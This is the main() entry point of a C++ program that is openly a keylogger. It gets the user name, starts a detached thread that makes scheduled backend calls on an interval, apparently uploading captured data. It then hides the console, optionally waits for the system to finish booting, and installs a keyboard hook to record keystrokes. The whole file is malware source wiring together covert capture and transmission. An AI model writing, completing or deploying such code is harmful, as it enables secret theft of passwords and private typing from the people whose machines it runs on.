#include "config.hpp"
#include "keylogger.hpp"
#include "logger_utils.hpp"
#include "network.hpp"
#include <iostream>
#include <thread>
#include <map>

int main() {
    std::string compName = getUserName();
    std::cout << compName;
    std::thread schedulerThread(scheduleBackendCalls, intervalMinutes * 60);
    schedulerThread.detach();
    Keylogger::SetConsoleVisibility();
#ifdef BOOT_WAIT
    while (Keylogger::IsSystemBooting()) {
        Sleep(10000);
    }
#endif
    Keylogger& logger = Keylogger::GetInstance();
    logger.InstallHook();
    logger.Run();
} 